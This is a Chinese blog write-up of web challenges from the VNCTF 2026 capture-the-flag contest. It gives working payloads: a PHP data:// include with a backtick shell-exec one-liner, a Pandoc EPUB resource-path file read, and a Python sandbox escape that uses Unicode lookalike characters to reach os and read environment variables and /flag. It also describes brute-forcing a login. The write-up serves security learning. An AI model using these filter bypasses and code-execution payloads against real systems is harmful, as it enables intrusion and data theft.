---
title: VNCTF-2026-Web WP
date: 2026-03-10 00:02:01
tags: wp/sum
categories: 赛后wp
index_img: /img/2.jpeg
banner_img: /img/2.jpeg
---

## Signin

审视源码发现过滤了['/', 'convert', 'base', 'text', 'plain']
由GET体file传参进行文件包含（当file长度小等于20时）
于是便可以用data协议进行文件上传包含，但是//被ban，所以可以用短符号简写绕过：data;,
然后，由于include具有解析上传文件的特性，能把上传的文件当作php代码识别，故可以写出以下payload：

```php
?file=data:,<?phpinfo();?>
```

 

![](/img//vnctf2026/1.png)

phpinfo显示short_open_tag=On，所以可以用短标签减少字数
随后就可以构建一句话了
原本是<?=eval($_GET[x]);这样的，但是长度超20了
于是上网搜得反引号是 shell_exec() 的语法糖
即

```php
$_GET[0] ===  shell_exec($_GET[0])
```

（题目不支持POST传参)
所以构得最后payload：

```php
?file=data:,<?=`$_GET[x]`;&x=cat /flag
```

得到flag

![](/img//vnctf2026/2.png)

## 渗透测试

题目是一个登录框，给了一个密码附件，很明显是要去爆破密码，一共两万个密码（）
Burp suite抓包发现上传的参数被加密了，所以直接用intruder爆破肯定不现实，所以便然ai写了个模拟键盘输入的python脚本一个个爆破密码，用户名admin
最后跑了一个晚上跑出来了（分多个虚拟机同时跑），密码是5V26s9dBZQVBZgyyVC00baeW

![](/img//vnctf2026/3.png)

##  Markdown2world

首先试了一下上传别的后缀文件，提示只能上传.md或.markdown后缀的文件，于是只能在Pandoc机制，转换机制，和不同类型文件的特性中研究
题目提示了 

![](/img//vnctf2026/4.png)

于是只能上网搜一下这几种文件都有哪些可能的漏洞

发现可以试试tamplate模板注入，于是构造payload：

```
template: /flag

xxxxxxxxx（一定要写）
```

上传，发现被拦截了
template和reference-doc被过滤，pdf文件有上传不了，只能试试通过资源文件引用+EPUB打包机制 进行任意文件读取，或者通过文件名注入命令了
首先是看了上传后文件名会被重新修改，于是随便上传了一个名为<?phpinfo();?>.md的文件。但是没用
那就只能试试Pandoc的特性:
Pandoc生成EPUB时，有一个特性叫 "Resource Fetching"（资源抓取），只要通过构造特殊的资源抓取语句来改变EPUB抓取的资源的路径即可达到类似于“文件包含”的效果，将flag打包下载下来

Payload（可以多设几条路径提高拿到flag的概率）：

```
resource-path: ["/", "/tmp", "/home/ctf", "."]
---

![flag](/flag)
```

下载下来后可以改后缀为.zip来解压
在解压包中拿到flag：

![](/img//vnctf2026/5.png)

![](/img//vnctf2026/6.png)

（本来想试试docx和html的漏洞的，但试了几个常见的payload发现没那么简单）

## I really really really

看到题目发现考的是python沙箱逃逸（慌了），只能现学现卖了()
先进行简单的fuzz测试，发现常规的’ “ [ ] { } __ ;和数字0-9都被过滤了，hint提及unicode，于是就去搜寻这些字符有关的unicode编码其他格式（查了超多资料，这里只写了有用的编码）
发现单引号:  ʼ [U+02BC]修饰符右单引号
没被过滤
发现_没被过滤
就想着引入模块去做，结果发现几乎全部的模块都被删了（应该是所有的）
首先先要解决__的问题，这里用了fuzz测试了多种组合：_̲  ﹍﹎ ﹏﹍ ⁔﹍ ﹋﹌等等等一大把
最后发现只有_̲ 和 ﹎_没被过滤，本来以为_̲ 可以，结果不知道为啥系统自动识别成了普通字符

![](/img//vnctf2026/7.png)

![](/img//vnctf2026/8.png)


随后就是关键字的问题，本来想着用ʼ claʼ +ʼss ʼ的方法绕过的，但是失败了，但是后来看到题目的字体后才发觉可以试试数学花体字母𝓬𝓵𝓪𝓼𝓼，于是就成功了
等基本的完工后就运用一点ssti的知识读取flag
但是不知道为啥始终返回空白
等后面群里师傅说在环境变量里也有flag才找到另一条生路
首先鉴于单行字符不能超过30，所以采用拼接的方式串联起payload：

```python
a=()
b=a._﹍𝓬𝓵𝓪𝓼𝓼﹍_
c=b._﹍𝓫𝓪𝓼𝓮﹍_
d=c._﹍𝓼𝓾𝓫𝓬𝓵𝓪𝓼𝓼𝓮𝓼﹍_()
for x in d:
 try:
  g=x._﹍𝓲𝓷𝓲𝓽﹍_._﹍𝓰𝓵𝓸𝓫𝓪𝓵𝓼﹍_
except:pass
```

随后就是通过报错
（触发AssertionError: <r的内容>，错误信息一定会显示在网页回显中）读取environ字典了

```python
a=()
b=a._﹍𝓬𝓵𝓪𝓼𝓼﹍_
c=b._﹍𝓫𝓪𝓼𝓮﹍_
d=c._﹍𝓼𝓾𝓫𝓬𝓵𝓪𝓼𝓼𝓮𝓼﹍_()
r=()
for x in d:
 try:
  g=x._﹍𝓲𝓷𝓲𝓽﹍_._﹍𝓰𝓵𝓸𝓫𝓪𝓵𝓼﹍_
  e=g.get(k).environ
  r=e
 except:pass
assert ...!=...,r
```

但是这个回显是 

![](/img//vnctf2026/9.png)

跟ai探讨了一个小时左右，发现原来不是模块被删了，而是放到别的模块去了（应该是的），所以只能利用一个try/expect循环遍历__init__.__globals__找到包含os模块的globals
最后生成的payload如下：

```python
a=()
b=a._﹍𝓬𝓵𝓪𝓼𝓼﹍_
c=b._﹍𝓫𝓪𝓼𝓮﹍_
d=c._﹍𝓼𝓾𝓫𝓬𝓵𝓪𝓼𝓼𝓮𝓼﹍_()
r=()
for x in d:
 try:
  g=x._﹍𝓲𝓷𝓲𝓽﹍_._﹍𝓰𝓵𝓸𝓫𝓪𝓵𝓼﹍_
  for k in g:
   try:
    e=g.get(k).environ
    r=e
   except:pass
 except:pass
assert ...!=...,r
```

在环境变量中找到flag：

![](/img//vnctf2026/10.png)

其实我本来是想把flag导入到同目录的文件中的

```python
a=()
b=a._﹍𝓬𝓵𝓪𝓼𝓼﹍_
c=b._﹍𝓫𝓪𝓼𝓮﹍_
d=c._﹍𝓼𝓾𝓫𝓬𝓵𝓪𝓼𝓼𝓮𝓼﹍_()
r=()
for x in d:
 try:
  g=x._﹍𝓲𝓷𝓲𝓽﹍_._﹍𝓰𝓵𝓸𝓫𝓪𝓵𝓼﹍_
  h=g.get(ʼosʼ)
  h.system(ʼcat /flag>/tmp/aʼ)
 except:
  pass
assert ...!=...,r
```

但是代码太长了，导致不能实现
